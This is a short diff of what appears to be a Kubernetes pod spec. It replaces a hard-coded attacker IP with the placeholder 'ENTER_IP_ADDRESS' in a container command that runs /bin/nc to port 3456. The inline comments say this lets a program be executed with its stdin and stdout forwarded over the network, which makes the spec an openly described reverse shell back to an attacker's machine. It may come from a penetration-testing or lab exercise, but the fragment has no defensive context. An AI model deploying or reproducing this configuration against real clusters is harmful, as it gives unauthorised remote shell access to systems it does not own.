@@ -14,7 +14,7 @@ spec:
         # netcat
         - /bin/nc
         # attacker device IP address
-        - "192.168.0.110"
+        - "ENTER_IP_ADDRESS"
         # port
         - "3456"
         # allows executing program and forwards its stdin/out through network connection
